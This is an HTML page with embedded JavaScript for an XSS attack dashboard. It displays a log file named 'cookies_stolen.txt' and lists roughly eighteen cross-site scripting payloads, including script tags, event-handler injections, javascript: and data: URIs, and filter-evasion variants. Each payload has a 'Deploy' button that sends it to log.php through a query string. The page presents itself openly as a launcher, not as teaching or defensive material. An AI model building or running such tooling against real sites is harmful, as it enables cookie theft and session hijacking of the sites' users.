<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>XSS Log Monitor & Payload Launcher</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 2em; }
        textarea { width: 100%; height: 300px; }
        .section { margin-bottom: 2em; }
        .payload { background: #f8f8f8; border: 1px solid #ccc; padding: 0.5em; margin: 0.2em 0; }
        .payload-launch { margin-top: 1em; }
        .download-btn { margin-top: 1em; }
    </style>
</head>
<body>
    <h1>XSS Log Monitor & Payload Launcher</h1>

    <div class="section">
        <h2>Monitor Logs</h2>
        <form method="get">
            <button type="submit">Refresh Logs</button>
        </form>
        <textarea readonly id="logArea">Loading...</textarea>
        <form method="get" action="log-request.php">
            <button class="download-btn" type="submit">Download Full Log</button>
        </form>
    </div>

    <div class="section">
        <h2>Deploy XSS Payloads</h2>
        <div id="payloads"></div>
        <div class="payload-launch">
            <label>Custom Payload: <input type="text" id="customPayload" size="60"></label>
            <button onclick="launchPayload()">Deploy</button>
        </div>
    </div>

    <script>
    // Fetch and display logs
    function fetchLogs() {
        fetch('cookies_stolen.txt')
            .then(r => r.ok ? r.text() : 'Log not found.')
            .then(txt => document.getElementById('logArea').value = txt)
            .catch(() => document.getElementById('logArea').value = 'Error loading log.');
    }
    fetchLogs();

    // XSS Payloads (same as in log.php)
    const payloads = [
        "'a'.replace.call`1${/./}${alert}`",
        "'a,'.replace`a${alert}`",
        "'a'.replace(/./,alert)",
        "<script>alert('XSS')</script>",
        "<script>alert(1)</script>",
        "<script>confirm('XSS')</script>",
        "<script>prompt('XSS')</script>",
        '"><script>alert(\'XSS\')</script>',
        "'><script>alert('XSS')</script>",
        '<img src=x onerror=alert(\'XSS\')>',
        '<svg onload=alert(\'XSS\')>',
        '<iframe srcdoc="<script>alert(\'XSS\')</script>">',
        'javascript:alert(\'XSS\')',
        'data:text/html,<script>alert(\'XSS\')</script>',
        '<svg/onload=alert(\'XSS\')>',
        '<script>/**/alert(\'XSS\')</script>',
        '<script>setTimeout(\'alert(\\\"XSS\\\")\',1)</script>',
        '<script>alert(String.fromCharCode(88,83,83))</script>'
    ];
    const payloadsDiv = document.getElementById('payloads');
    payloads.forEach(p => {
        const el = document.createElement('div');
        el.className = 'payload';
        el.textContent = p;
        const btn = document.createElement('button');
        btn.textContent = 'Deploy';
        btn.onclick = () => launchPayload(p);
        el.appendChild(btn);
        payloadsDiv.appendChild(el);
    });

    // Deploy payload (open attack URL with payload)
    function launchPayload(payload) {
        payload = payload || document.getElementById('customPayload').value;
        if (!payload) return alert('Enter a payload!');
        const url = 'log.php?c=' + encodeURIComponent(payload);
        window.open(url, '_blank');
    }
    </script>
</body>
</html>
